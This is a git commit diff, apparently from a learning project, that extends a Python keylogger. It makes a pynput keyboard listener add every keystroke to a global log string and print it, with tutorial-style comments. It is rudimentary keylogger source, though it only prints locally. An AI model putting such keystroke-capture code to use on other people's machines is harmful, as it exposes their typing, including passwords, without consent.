cf21ff5816ea6ede476fb61d57fa97c6241e6db1
Tom Wittmann <TomWittmann@alumni.wfu.edu>
2020-05-05 20:31:08 -0400

    Added global variable to store all key strokes

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,19 @@
-
 '''
 Allows us to monitor and control mouse and keyboard.
 '''
 import pynput.keyboard
 
+log = ""
+
+'''
+A callback function. A callback function is a function passed to a method so that the method
+can call the function when the method has completed its work. 
+'''
 def process_key_press(key):
-    print(key)
+    global log  #Using global variable so it is not created every time.
+    log += str(key)
+    print(log)
+
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)    #Everytime a key is pressed print it.
 
